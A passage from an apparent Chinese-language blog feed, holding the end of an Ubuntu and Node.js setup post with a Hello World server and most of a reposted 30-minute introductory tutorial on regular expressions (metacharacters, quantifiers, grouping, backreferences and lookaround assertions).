class="line"></span><br></pre></td></tr></table></figure><h3>github</h3><p>网上看了不少文章，觉得这两篇还算不错。</p><p>配置：<a href="http://blog.csdn.net/lalor/article/details/7830895">http://blog.csdn.net/lalor/article/details/7830895</a></p><p>使用：<a href="http://blog.csdn.net/wfdtxz/article/details/7973608">http://blog.csdn.net/wfdtxz/article/details/7973608</a></p><p>推荐：<a href="http://my.oschina.net/shipley/blog/98477" target="_blank">http://my.oschina.net/shipley/blog/98477</a></p><h3>前端这一块</h3><p><strong>1. wamp环境配置，应该是lamp</strong>，呵呵。<a title="ubuntu下安装Apache+PHP+Mysql" href="http://www.cnblogs.com/hustskyking/articles/apache-php-mysql.html" target="_blank">戳我</a></p><p>转载的文章，感觉比较不错，放在自己家里。</p><p><strong>2. nodeJS</strong></p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install nodejs</span><br><span class="line">sudo apt-<span class="built_in">get</span> install npm</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比较不喜欢找源码，然后这样做</p><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line"><span class="built_in">make</span></span><br><span class="line">sudo <span class="built_in">make</span> install</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>apt-get真心方便~</p><p>然后尽兴添加你想要的组建</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span> express</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然，安装好了之后测试下</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">nodejs <span class="comment">--version</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有输出说明是正确的。下面给一串代码，让乃测试</p><figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">var http = require(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"><span class="keyword">function</span> onRequest(<span class="built_in">request</span>, <span class="built_in">response</span>) &#123;</span><br><span class="line">    console.<span class="built_in">log</span>(<span class="string">&quot;Request received.&quot;</span>);</span><br><span class="line">    <span class="built_in">response</span>.writeHead(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>&#125;);</span><br><span class="line">    <span class="built_in">response</span>.write(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    <span class="built_in">response</span>.<span class="keyword">end</span>();</span><br><span class="line">&#125;</span><br><span class="line">http.createServer(onRequest).listen(<span class="number">8888</span>);</span><br><span class="line">console.<span class="built_in">log</span>(<span class="string">&quot;Server has started.&quot;</span>);</span><br><span class="line"></span><br><span class="line"> 测试代码</span><br></pre></td></tr></table></figure><p><span>&nbsp;</span></p><h3>笔者感言</h3><p><strong>1.</strong> 建议新手还是玩<strong>稳定版本</strong>，10.04&nbsp; 12.04这些算是经典版本了。</p><p><span><em>以上基本都是没有补充完善，先把几个记得比较清楚的点列出来，下次有时间，慢慢说～</em></span></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式30分钟入门教程</title>
      <link href="/blog/2013/06/04/cb-RegExp/"/>
      <url>/blog/2013/06/04/cb-RegExp/</url>
      
        <content type="html"><![CDATA[<div id="top"><span>正则表达式30分钟入门教程</span></div><h3 id="contents">目录<a title="转到正文内容" href="#mission"></a></h3><ol><li><a href="#mission">本文目标</a></li><li><a href="#howtouse">如何使用本教程</a></li><li><a href="#introduction">正则表达式到底是什么东西？</a></li><li><a href="#getstarted">入门</a></li><li><a href="#testing">测试正则表达式</a></li><li><a href="#metacode">元字符</a></li><li><a href="#escape">字符转义</a></li><li><a href="#repeat">重复</a></li><li><a href="#charclass">字符类</a></li><li><a href="#alternative">分枝条件</a></li><li><a href="#negation">反义</a></li><li><a href="#grouping">分组</a></li><li><a href="#backreference">后向引用</a></li><li><a href="#lookaround">零宽断言</a></li><li><a href="#negativelookaround">负向零宽断言</a></li><li><a href="#commenting">注释</a></li><li><a href="#greedyandlazy">贪婪与懒惰</a></li><li><a href="#regexoptions">处理选项</a></li><li><a href="#balancedgroup">平衡组/递归匹配</a></li><li><a href="#more">还有些什么东西没提到</a></li></ol><h3 id="mission">本文目标</h3><p>30分钟内让你明白正则表达式是什么，并对它有一些基本的了解，让你可以在自己的程序或网页里使用它。</p><h3 id="howtouse">如何使用本教程</h3><p id="giveMe30Minutes" class="important note"><span>最重要的是&mdash;&mdash;请给我<em>30分钟</em>，如果你没有使用正则表达式的经验，请不要试图在30<em>秒</em>内入门&mdash;&mdash;除非你是超人 :)</span></p><p>别被下面那些复杂的表达式吓倒，只要跟着我一步一步来，你会发现正则表达式其实并<span lang="zh-cn">没有</span>你想像中的那么困难。当然，如果你看完了这篇教程之后，发现自己明白了很多，却又几乎什么都记不得，那也是很正常的&mdash;&mdash;我认为，没接触过正则表达式的人在看完这篇教程后，能把提到过的语法记住80%以上的可能性为零。这里只是让你明白基本的原理，以后你还需要多练习，多使用，才能熟练掌握正则表达式。</p><p>除了作为入门教程之外，本文还试图成为可以在日常工作中使用的正则表达式语法参考手册。就作者本人的经历来说，这个目标还是完成得不错的&mdash;&mdash;你看，我自己也没能把所有的东西记下来，不是吗？</p><p><a id="clearButton" onclick="return clearFormats();" href="http://deerchao.net/tutorials/regex/regex.htm">清除格式</a>&nbsp;文本格式约定：<strong><span class="name">专业术语</span></strong>&nbsp;<span class="code">元字符/语法格式</span><span>&nbsp;<span class="regex">正则表达式</span>&nbsp;</span><span class="part">正则表达式中的一部分(用于分析)</span>&nbsp;<span class="string">对其进行匹配的源字符串</span>&nbsp;<span class="desc">对正则表达式或其中一部分的说明</span></p><p><a id="hideButton" onclick="return hideNotes();" href="http://deerchao.net/tutorials/regex/regex.htm">隐藏边注</a>&nbsp;本文右边有一些注释，主要是用来提供一些相关信息，或者给没有程序员背景的读者解释一些基本概念，通常可以忽略。</p><h3 id="introduction">正则表达式到底是什么东西？</h3><p class="note"><span class="name">字符</span>是计算机软件处理文字时最基本的单位，可能是字母，数字，标点符号，空格，换行符，汉字等等。<span class="name">字符串</span>是0个或更多个字符的序列。<span class="name">文本</span>也就是文字，字符串。说某个字符串<span class="name">匹配</span>某个正则表达式，通常是指这个字符串里有一部分（或几部分分别）能满足表达式给出的条件。</p><p>在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要。<strong><span class="name">正则表达式</span></strong>就是用于描述这些规则的工具。换句话说，正则表达式就是记录文本规则的代码。</p><p>很可能你使用过Windows/Dos下用于文件查找的<strong><span class="name">通配符(wildcard)</span></strong>，也就是<span class="code">*</span>和<span class="code">?</span>。如果你想查找某个目录下的所有的Word文档的话，你会搜索<span>*.doc</span>。在这里，<span class="code">*</span>会被解释成任意的字符串。和通配符类似，正则表达式也是用来进行文本匹配的工具，只不过比起通配符，它能更精确地描述你的需求&mdash;&mdash;当然，代价就是更复杂&mdash;&mdash;比如你可以编写一个正则表达式，用来查找<span><span class="desc">所有以0开头，后面跟着2-3个数字，然后是一个连字号\-"，最后是7或8位数字的字符串</span></span>(像<span class="string">010-12345678</span>或<span class="string">0376-7654321</span>)。</p><h3 id="getstarted">入门</h3><p>学习正则表达式的最好方法是从例子开始，理解例子之后再自己对例子进行修改，实验。下面给出了不少简单的例子，并对它们作了详细的说明。</p><p>假设你在一篇英文小说里查找<span class="desc">hi</span>，你可以使用正则表达式<span class="regex">hi</span>。</p><p>这几乎是最简单的正则表达式了，它可以精确匹配这样的字符串：<span><span class="desc">由两个字符组成，前一个字符是h,后一个是i</span></span>。通常，处理正则表达式的工具会提供一个忽略大小写的选项，如果选中了这个选项，它可以匹配<span class="string">hi</span>,<span class="string">HI</span>,<span class="string">Hi</span>,<span class="string">hI</span>这四种情况中的任意一种。</p><p>不幸的是，很多单词里包含<span class="string">hi</span>这两个连续的字符，比如<span class="string">him</span>,<span class="string">history</span>,<span class="string">high</span>等等。用<span class="regex">hi</span>来查找的话，这里边的<span class="string">hi</span>也会被找出来。如果要<span><span class="desc">精确地查找hi这个单词</span></span>的话，我们应该使用<span class="regex">\bhi\b</span>。</p><p><span class="part">\b</span>是正则表达式规定的一个特殊代码（好吧，某些人叫它<span class="name"><strong>元字符</strong>，<strong>metacharacter</strong></span>），代表着<span class="desc">单词的开头或结尾，也就是单词的分界处</span>。虽然通常英文的单词是由空格，标点符号或者换行来分隔的，但是<span class="code">\b</span>并不匹配这些单词分隔字符中的任何一个，它<strong>只匹配一个位置</strong>。</p><p class="note">如果需要更精确的说法，<span class="code">\b</span>匹配这样的位置：它的前一个字符和后一个字符不全是(一个是,一个不是或不存在)<span class="code">\w</span>。</p><p>假如你要找的是<span class="desc">hi后面不远处跟着一个Lucy</span>，你应该用<span class="regex">\bhi\b.*\bLucy\b</span>。</p><p>这里，<span class="part">.</span>是另一个元字符，匹配<span class="desc">除了换行符以外的任意字符</span>。<span class="part">*</span>同样是元字符，不过它代表的不是字符，也不是位置，而是数量&mdash;&mdash;它指定*<span><span class="desc">前边的内容可以连续重复使用任意次以使整个表达式得到匹配</span></span>。因此，<span class="part">.*</span>连在一起就意味着<span class="desc">任意数量的不包含换行的字符</span>。现在<span class="regex">\bhi\b.*\bLucy\b</span>的意思就很明显了：<span><span class="desc">先是一个单词hi,然后是任意个任意字符(但不能是换行)，最后是Lucy这个单词</span></span>。</p><p class="note">换行符就是'\n',ASCII编码为10(十六进制0x0A)的字符。</p><p>如果同时使用其它元字符，我们就能构造出功能更强大的正则表达式。比如下面这个例子：</p><p><span class="regex">0\d\d-\d\d\d\d\d\d\d\d</span>匹配这样的字符串：<span class="desc">以0开头，然后是两个数字，然后是一个连字号\-"，最后是8个数字</span>(也就是中国的电话号码。当然，这个例子只能匹配区号为3位的情形)。</p><p>这里的<span class="part">\d</span>是个新的元字符，匹配<span class="desc">一位数字(0，或1，或2，或......)</span>。<span class="part">-</span>不是元字符，只匹配它本身&mdash;&mdash;连字符(或者减号，或者中横线，或者随你怎么称呼它)。</p><p>为了避免那么多烦人的重复，我们也可以这样写这个表达式：<span class="regex">0\d{2}-\d{8}</span>。 这里<span class="part">\d</span>后面的<span class="part">{2}</span>(<span class="part">{8}</span>)的意思是前面<span class="part">\d</span><span class="desc">必须连续重复匹配2次(8次)</span>。</p><h3 id="testing">测试正则表达式</h3><div class="note"><p>其它可用的测试工具:</p><ul><li><a href="http://www.regexbuddy.com/">RegexBuddy</a></li><li><a href="http://regexpal.com/">Javascript正则表达式在线测试工具</a></li></ul></div><p>如果你不觉得正则表达式很难读写的话，要么你是一个天才，要么，你不是地球人。正则表达式的语法很令人头疼，即使对经常使用它的人来说也是如此。由于难于读写，容易出错，所以找一种工具对正则表达式进行测试是很有必要的。</p><p>不同的环境下正则表达式的一些细节是不相同的，本教程介绍的是微软 .Net Framework 4.0 下正则表达式的行为，所以，我向你推荐我编写的.Net下的工具 <a title="转到RegexTester页面" href="http://www.cnblogs.com/tools/regex_tester/index.htm">正则表达式测试器</a>。请参考该页面的说明来安装和运行该软件。</p><h3 id="metacode">元字符</h3><p>现在你已经知道几个很有用的元字符了，如<span class="code">\b</span>,<span class="code">.</span>,<span class="code">*</span>，还有<span class="code">\d</span>.正则表达式里还有更多的元字符，比如<span class="code">\s</span>匹配<span class="desc">任意的空白符，包括空格，制表符(Tab)，换行符，中文全角空格等</span>。<span class="code">\w</span>匹配<span class="desc">字母或数字或下划线或汉字等</span>。</p><p class="note important"><span>对中文/汉字的特殊处理是由.Net提供的正则表达式引擎支持的，其它环境下的具体情况请查看相关文档。</span></p><p>下面来看看更多的例子：</p><p><span class="regex">\ba\w*\b</span>匹配<span class="desc">以字母<span class="part">a</span>开头的单词&mdash;&mdash;先是某个单词开始处(<span class="part">\b</span>)，然后是字母<span class="part">a</span>,然后是任意数量的字母或数字(<span class="part">\w*</span>)，最后是单词结束处(<span class="part">\b</span>)</span>。</p><p class="note">好吧，现在我们说说正则表达式里的单词是什么意思吧：就是不少于一个的连续的<span class="code">\w</span>。不错，这与学习英文时要背的成千上万个同名的东西的确关系不大 :)</p><p><span class="regex">\d+</span>匹配<span class="desc">1个或更多连续的数字</span>。这里的<span class="part">+</span>是和<span class="code">*</span>类似的元字符，不同的是<span class="code">*</span>匹配<span class="desc">重复任意次(可能是0次)</span>，而<span class="code">+</span>则匹配<span class="desc">重复1次或更多次</span>。</p><p><span class="regex">\b\w{6}\b </span>匹配<span class="desc">刚好6个字符的单词</span>。</p><table cellspacing="0"><caption>表1.常用的元字符</caption><thead><tr><th scope="col">代码</th><th scope="col">说明</th></tr></thead><tbody><tr><td><span class="code">.</span></td><td><span class="desc">匹配除换行符以外的任意字符</span></td></tr><tr><td><span class="code">\w</span></td><td><span class="desc">匹配字母或数字或下划线或汉字</span></td></tr><tr><td><span class="code">\s</span></td><td><span class="desc">匹配任意的空白符</span></td></tr><tr><td><span class="code">\d</span></td><td><span class="desc">匹配数字</span></td></tr><tr><td><span class="code">\b</span></td><td><span class="desc">匹配单词的开始或结束</span></td></tr><tr><td><span class="code">^</span></td><td><span class="desc">匹配字符串的开始</span></td></tr><tr><td><span class="code">$</span></td><td><span class="desc">匹配字符串的结束</span></td></tr></tbody></table><p class="note">正则表达式引擎通常会提供一个\测试指定的字符串是否匹配一个正则表达式"的方法，如JavaScript里的RegExp.test()方法或.NET里的Regex.IsMatch()方法。这里的匹配是指是字符串里有没有符合表达式规则的部分。如果不使用<span class="code">^</span>和<span class="code">$</span>的话，对于<span class="regex">\d{5,12}</span>而言，使用这样的方法就只能保证字符串里<span class="desc">包含5到12连续位数字</span>，而不是整个字符串就是5到12位数字。</p><p>元字符<span class="code">^</span>（和数字6在同一个键位上的符号）和<span class="code">$</span>都匹配一个位置，这和<span class="code">\b</span>有点类似。<span class="code">^</span>匹配你要用来查找的字符串的开头，<span class="code">$</span>匹配结尾。这两个代码在验证输入的内容时非常有用，比如一个网站如果要求你填写的QQ号必须为5位到12位数字时，可以使用：<span class="regex">^\d{5,12}$</span>。</p><p>这里的<span class="part">{5,12}</span>和前面介绍过的<span class="part">{2}</span>是类似的，只不过<span class="part">{2}</span>匹配<span class="desc">只能不多不少重复2次</span>，<span class="part">{5,12}</span>则是<span class="desc">重复的次数不能少于5次，不能多于12次</span>，否则都不匹配。</p><p>因为使用了<span class="part">^</span>和<span class="part">$</span>，所以输入的整个字符串都要用来和<span class="part">\d{5,12}</span>来匹配，也就是说整个输入<span class="desc">必须是5到12个数字</span>，因此如果输入的QQ号能匹配这个正则表达式的话，那就符合要求了。</p><p>和忽略大小写的选项类似，有些正则表达式处理工具还有一个处理多行的选项。如果选中了这个选项，<span class="code">^</span>和<span class="code">$</span>的意义就变成了<span class="desc">匹配行的开始处和结束处</span>。</p><h3 id="escape">字符转义</h3><p>如果你想查找元字符本身的话，比如你查找<span class="desc">.</span>,或者<span class="desc">*</span>,就出现了问题：你没办法指定它们，因为它们会被解释成别的意思。这时你就得使用<span class="code">\</span>来取消这些字符的特殊意义。因此，你应该使用<span class="regex">\.</span>和<span class="regex">\*</span>。当然，要查找<span class="desc">\</span>本身，你也得用<span class="regex">\\</span>.</p><p>例如：<span class="regex">deerchao\.net</span>匹配<span class="desc">deerchao.net</span>，<span class="regex">C:\\Windows</span>匹配<span class="desc">C:\Windows</span>。</p><h3 id="repeat">重复</h3><p>你已经看过了前面的<span><span class="code">*</span>,<span class="code">+</span>,<span class="code">{2}</span>,<span class="code">{5,12}</span></span>这几个匹配重复的方式了。下面是正则表达式中所有的限定符(指定数量的代码，例如*,{5,12}等)：</p><table cellspacing="0"><caption>表2.常用的限定符</caption><thead><tr><th scope="col">代码/语法</th><th scope="col">说明</th></tr></thead><tbody><tr><td><span class="code">*</span></td><td><span class="desc">重复零次或更多次</span></td></tr><tr><td><span class="code">+</span></td><td><span class="desc">重复一次或更多次</span></td></tr><tr><td><span class="code">?</span></td><td><span class="desc">重复零次或一次</span></td></tr><tr><td><span class="code">{n}</span></td><td><span class="desc">重复n次</span></td></tr><tr><td><span class="code">{n,}</span></td><td><span class="desc">重复n次或更多次</span></td></tr><tr><td><span class="code">{n,m}</span></td><td><span class="desc">重复n到m次</span></td></tr></tbody></table><p>下面是一些使用重复的例子：</p><p><span class="regex">Windows\d+</span>匹配<span class="desc">Windows后面跟1个或更多数字</span></p><p><span class="regex">^\w+</span>匹配<span class="desc">一行的第一个单词(或整个字符串的第一个单词，具体匹配哪个意思得看选项设置)</span></p><h3 id="charclass">字符类</h3><p>要想查找数字，字母或数字，空白是很简单的，因为已经有了对应这些字符集合的元字符，但是如果你想匹配没有预定义元字符的字符集合(比如元音字母a,e,i,o,u),应该怎么办？</p><p>很简单，你只需要在方括号里列出它们就行了，像<span class="regex">[aeiou]</span>就匹配<span class="desc">任何一个英文元音字母</span>，<span class="regex">[.?!]</span>匹配<span class="desc">标点符号(.或?或!)</span>。</p><p>我们也可以轻松地指定一个字符<span class="name">范围</span>，像<span class="regex">[0-9]</span>代表的含意与<span class="regex">\d</span>就是完全一致的：<span class="desc">一位数字</span>；同理<span class="regex">[a-z0-9A-Z_]</span>也完全等同于<span class="code">\w</span>（如果只考虑英文的话）。</p><p>下面是一个更复杂的表达式：<span class="regex">\(?0\d{2}[) -]?\d{8}</span>。</p><p class="note">\("和\)"也是元字符，后面的<a href="#grouping">分组节</a>里会提到，所以在这里需要使用<a href="#escape">转义</a>。</p><p>这个表达式可以匹配<span class="desc">几种格式的电话号码</span>，像<span class="string">(010)88886666</span>，或<span class="string">022-22334455</span>，或<span class="string">02912345678</span>等。我们对它进行一些分析吧：首先是一个转义字符<span class="part">\(</span>,它能出现0次或1次(<span class="part">?</span>),然后是一个<span class="part">0</span>，后面跟着2个数字(<span class="part">\d{2}</span>)，然后是<span class="part">)</span>或<span class="part">-</span>或<span class="part">空格</span>中的一个，它出现1次或不出现(<span class="part">?</span>)，最后是8个数字(<span class="part">\d{8}</span>)。</p><h3 id="alternative">分枝条件</h3><p>不幸的是，刚才那个表达式也能匹配<span class="string">010)12345678</span>或<span class="string">(022-87654321</span>这样的\不正确"的格式。要解决这个问题，我们需要用到<span class="name">分枝条件</span>。正则表达式里的<span class="name">分枝条件</span>指的是有几种规则，如果满足其中任意一种规则都应该当成匹配，具体方法是用<span class="code">|</span>把不同的规则分隔开。听不明白？没关系，看例子：</p><p><span class="regex">0\d{2}-\d{8}|0\d{3}-\d{7}</span>这个表达式能<span class="desc">匹配两种以连字号分隔的电话号码：一种是三位区号，8位本地号(如010-12345678)，一种是4位区号，7位本地号(0376-2233445)</span>。</p><p><span class="regex">\(?0\d{2}\)?[- ]?\d{8}|0\d{2}[- ]?\d{8}</span>这个表达式<span class="desc">匹配3位区号的电话号码，其中区号可以用小括号括起来，也可以不用，区号与本地号间可以用连字号或空格间隔，也可以没有间隔</span>。你可以试试用分枝条件把这个表达式扩展成也支持4位区号的。</p><p><span class="regex">\d{5}-\d{4}|\d{5}</span>这个表达式用于匹配美国的邮政编码。美国邮编的规则是5位数字，或者用连字号间隔的9位数字。之所以要给出这个例子是因为它能说明一个问题：<strong>使用分枝条件时，要注意各个条件的顺序</strong>。如果你把它改成<span class="regex">\d{5}|\d{5}-\d{4}</span>的话，那么就只会匹配5位的邮编(以及9位邮编的前5位)。原因是匹配分枝条件时，将会从左到右地测试每个条件，如果满足了某个分枝的话，就不会去再管其它的条件了。</p><h3 id="grouping">分组</h3><p>我们已经提到了怎么重复单个字符（直接在字符后面加上限定符就行了）；但如果想要重复多个字符又该怎么办？你可以用小括号来指定<span class="name">子表达式</span>(也叫做<span class="name">分组</span>)，然后你就可以指定这个子表达式的重复次数了，你也可以对子表达式进行其它一些操作(后面会有介绍)。</p><p><span class="regex">(\d{1,3}\.){3}\d{1,3}</span>是一个<span class="desc">简单的IP地址匹配</span>表达式。要理解这个表达式，请按下列顺序分析它：<span class="part">\d{1,3}</span>匹配<span class="desc">1到3位的数字</span>，<span class="part">(\d{1,3}\.){3}</span>匹配<span class="desc">三位数字加上一个英文句号(这个整体也就是这个<span class="name">分组</span>)重复3次</span>，最后再加上<span class="desc">一个一到三位的数字</span>(<span class="part">\d{1,3}</span>)。</p><p class="note">IP地址中每个数字都不能大于255，大家千万不要被《24》第三季的编剧给忽悠了......</p><p>不幸的是，它也将匹配<span class="string">256.300.888.999</span>这种不可能存在的IP地址。如果能使用算术比较的话，或许能简单地解决这个问题，但是正则表达式中并不提供关于数学的任何功能，所以只能使用冗长的分组，选择，字符类来描述一个正确的IP地址：<span><span class="regex">((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)</span>。</span></p><p>理解这个表达式的关键是理解<span class="part">2[0-4]\d|25[0-5]|[01]?\d\d?</span>，这里我就不细说了，你自己应该能分析得出来它的意义。</p><h3 id="negation">反义</h3><p>有时需要查找不属于某个能简单定义的字符类的字符。比如想查找除了数字以外，其它任意字符都行的情况，这时需要用到<span class="name">反义</span>：</p><table cellspacing="0"><caption>表3.常用的反义代码</caption><thead><tr><th scope="col">代码/语法</th><th scope="col">说明</th></tr></thead><tbody><tr><td><span class="code">\W</span></td><td><span class="desc">匹配任意不是字母，数字，下划线，汉字的字符</span></td></tr><tr><td><span class="code">\S</span></td><td><span class="desc">匹配任意不是空白符的字符</span></td></tr><tr><td><span class="code">\D</span></td><td><span class="desc">匹配任意非数字的字符</span></td></tr><tr><td><span class="code">\B</span></td><td><span class="desc">匹配不是单词开头或结束的位置</span></td></tr><tr><td><span class="code">[^x]</span></td><td><span class="desc">匹配除了x以外的任意字符</span></td></tr><tr><td><span class="code">[^aeiou]</span></td><td><span class="desc">匹配除了aeiou这几个字母以外的任意字符</span></td></tr></tbody></table><p>例子：<span class="regex">\S+</span>匹配<span class="desc">不包含空白符的字符串</span>。</p><p><span class="regex">&lt;a[^&gt;]+&gt;</span>匹配<span class="desc">用尖括号括起来的以a开头的字符串</span>。</p><h3 id="backreference">后向引用</h3><p>使用小括号指定一个子表达式后，<strong>匹配这个子表达式的文本</strong>(也就是此分组捕获的内容)可以在表达式或其它程序中作进一步的处理。默认情况下，每个分组会自动拥有一个<span class="name">组号</span>，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，以此类推。</p><div class="note"><p>呃......其实,组号分配还不像我刚说得那么简单：</p><ul><li>分组0对应整个正则表达式</li><li>实际上组号分配过程是要从左向右扫描两遍的：第一遍只给未命名组分配，第二遍只给命名组分配－－因此所有命名组的组号都大于未命名的组号</li><li>你可以使用<span class="code">(?:exp)</span>这样的语法来剥夺一个分组对组号分配的参与权．</li></ul></div><p><span class="name">后向引用</span>用于重复搜索前面某个分组匹配的文本。例如，<span class="part">\1</span>代表<span class="desc">分组1匹配的文本</span>。难以理解？请看示例：</p><p><span class="regex">\b(\w+)\b\s+\1\b</span>可以用来匹配<span class="desc">重复的单词</span>，像<span class="string">go go</span>, 或者<span class="string">kitty kitty</span>。这个表达式首先是<span class="desc">一个单词</span>，也就是<span class="desc">单词开始处和结束处之间的多于一个的字母或数字</span>(<span class="part">\b(\w+)\b</span>)，这个单词会被捕获到编号为1的分组中，然后是<span class="desc">1个或几个空白符</span>(<span class="part">\s+</span>)，最后是<span class="desc">分组1中捕获的内容（也就是前面匹配的那个单词）</span>(<span class="part">\1</span>)。</p><p>你也可以自己指定子表达式的<span class="name">组名</span>。要指定一个子表达式的组名，请使用这样的语法：<span class="code">(?&lt;Word&gt;\w+)</span>(或者把尖括号换成<span class="code">'</span>也行：<span class="code">(?'Word'\w+)</span>),这样就把<span class="part">\w+</span>的组名指定为<span class="part">Word</span>了。要反向引用这个分组<span class="name">捕获</span>的内容，你可以使用<span class="code">\k&lt;Word&gt;</span>,所以上一个例子也可以写成这样：<span class="regex">\b(?&lt;Word&gt;\w+)\b\s+\k&lt;Word&gt;\b</span>。</p><p>使用小括号的时候，还有很多特定用途的语法。下面列出了最常用的一些：</p><table cellspacing="0"><caption>表4.常用分组语法</caption><tbody><tr><th scope="col">分类</th><th scope="col">代码/语法</th><th scope="col">说明</th></tr><tr><th rowspan="3">捕获</th><td><span class="code">(exp)</span></td><td><span class="desc">匹配exp,并捕获文本到自动命名的组里</span></td></tr><tr><td><span class="code">(?&lt;name&gt;exp)</span></td><td><span class="desc">匹配exp,并捕获文本到名称为name的组里，也可以写成(?'name'exp)</span></td></tr><tr><td><span class="code">(?:exp)</span></td><td><span class="desc">匹配exp,不捕获匹配的文本，也不给此分组分配组号</span></td></tr><tr><th rowspan="4">零宽断言</th><td><span class="code">(?=exp)</span></td><td><span class="desc">匹配exp前面的位置</span></td></tr><tr><td><span class="code">(?&lt;=exp)</span></td><td><span class="desc">匹配exp后面的位置</span></td></tr><tr><td><span class="code">(?!exp)</span></td><td><span class="desc">匹配后面跟的不是exp的位置</span></td></tr><tr><td><span class="code">(?&lt;!exp)</span></td><td><span class="desc">匹配前面不是exp的位置</span></td></tr><tr><th rowspan="1">注释</th><td><span class="code">(?#comment)</span></td><td><span class="desc">这种类型的分组不对正则表达式的处理产生任何影响，用于提供注释让人阅读</span></td></tr></tbody></table><p>我们已经讨论了前两种语法。第三个<span class="code">(?:exp)</span>不会改变正则表达式的处理方式，只是这样的组匹配的内容<span class="desc">不会像前两种那样被捕获到某个组里面，也不会拥有组号</span>。\我为什么会想要这样做？"&mdash;&mdash;好问题，你觉得为什么呢？</p><h3 id="lookaround">零宽断言</h3><p class="note">地球人，是不是觉得这些术语名称太复杂，太难记了？我也有同感。知道有这么一种东西就行了，它叫什么，随它去吧！人若无名，便可专心练剑；物若无名，便可随意取舍......</p><p>接下来的四个用于查找在某些内容(但并不包括这些内容)之前或之后的东西，也就是说它们像<span class="code">\b</span>,<span class="code">^</span>,<span class="code">$</span>那样用于指定一个位置，这个位置应该满足一定的条件(即断言)，因此它们也被称为<span class="name">零宽断言</span>。最好还是拿例子来说明吧：</p><p class="note">断言用来声明一个应该为真的事实。正则表达式中只有当断言为真时才会继续进行匹配。</p><p><span class="code">(?=exp)</span>也叫<strong><span class="name">零宽度正预测先行断言</span></strong>，它<span><span class="desc">断言自身出现的位置的后面能匹配表达式exp</span></span>。比如<span class="regex">\b\w+(?=ing\b)</span>，匹配<span class="desc">以ing结尾的单词的前面部分(除了ing以外的部分)</span>，如查找<span class="string">I'm singing while you're dancing.</span>时，它会匹配<span class="desc">sing</span>和<span class="desc">danc</span>。</p><p><span class="code">(?&lt;=exp)</span>也叫<strong><span class="name">零宽度正回顾后发断言</span></strong>，它<span><span class="desc">断言自身出现的位置的前面能匹配表达式exp</span></span>。比如<span class="regex">(?&lt;=\bre)\w+\b</span>会匹配<span class="desc">以re开头的单词的后半部分(除了re以外的部分)</span>，例如在查找<span class="string">reading a book</span>时，它匹配<span class="desc">ading</span>。</p><p>假如你想要给一个很长的数字中每三位间加一个逗号(当然是从右边加起了)，你可以这样查找需要在前面和里面添加逗号的部分：<span class="regex">((?&lt;=\d)\d{3})+\b</span>，用它对<span class="string">1234567890</span>进行查找时结果是<span class="desc">234567890</span>。</p><p>下面这个例子同时使用了这两种断言：<span class="regex">(?&lt;=\s)\d+(?=\s)</span>匹配<span class="desc">以空白符间隔的数字(再次强调，不包括这些空白符)</span>。</p><h3>负向零宽断言</h3><p>前面我们提到过怎么查找<strong>不是某个字符或不在某个字符类里</strong>的字符的方法(反义)。但是如果我们只是想要<strong>确保某个字符没有出现，但并不想去匹配它</strong>时怎么办？例如，如果我们想查找这样的单词--它里面出现了字母q,但是q后面跟的不是字母u,我们可以尝试这样：</p><p><span class="regex">\b\w*q[^u]\w*\b</span>匹配<span class="desc">包含<strong>后面不是字母u的字母q</strong>的单词</span>。但是如果多做测试(或者你思维足够敏锐，直接就观察出来了)，你会发现，如果q出现在单词的结尾的话，像<strong>Iraq</strong>,<strong>Benq</strong>，这个表达式就会出错。这是因为<span class="part">[^u]</span>总要匹配一个字符，所以如果q是单词的最后一个字符的话，后面的<span class="part">[^u]</span>将会匹配q后面的单词分隔符(可能是空格，或者是句号或其它的什么)，后面的<span class="part">\w*\b</span>将会匹配下一个单词，于是<span class="regex">\b\w*q[^u]\w*\b</span>就能匹配整个<span class="string">Iraq fighting</span>。<span class="name">负向零宽断言</span>能解决这样的问题，因为它只匹配一个位置，并不<strong>消费</strong>任何字符。现在，我们可以这样来解决这个问题：<span class="regex">\b\w*q(?!u)\w*\b</span>。</p><p><strong><span class="name">零宽度负预测先行断言</span></strong><span class="code">(?!exp)</span>，<span class="desc">断言此位置的后面不能匹配表达式exp</span>。例如：<span class="regex">\d{3}(?!\d)</span>匹配<span class="desc">三位数字，而且这三位数字的后面不能是数字</span>；<span class="regex">\b((?!abc)\w)+\b</span>匹配<span class="desc">不包含连续字符串abc的单词</span>。</p><p>同理，我们可以用<span class="code">(?&lt;!exp)</span>,<span class="name">零宽度负回顾后发断言</span>来<span class="desc">断言此位置的前面不能匹配表达式exp</span>：<span class="regex">(?&lt;![a-z])\d{7}</span>匹配<span class="desc">前面不是小写字母的七位数字</span>。</p><p class="note">请详细分析表达式<span class="regex">(?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;)</span>，这个表达式最能表现零宽断言的真正用途。</p><p>一个更复杂的例子：<span class="regex">(?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;)</span>匹配<span class="desc">不包含属性的简单HTML标签内里的内容</span>。<span class="code">(?&lt;=&lt;(\w+)&gt;)</span>指定了这样的<span class="name">前缀</span>：<span class="desc">被尖括号括起来的单词</span>(比如可能是&lt;b&gt;)，然后是<span class="part">.*</span>(任意的字符串),最后是一个<span class="name">后缀</span><span 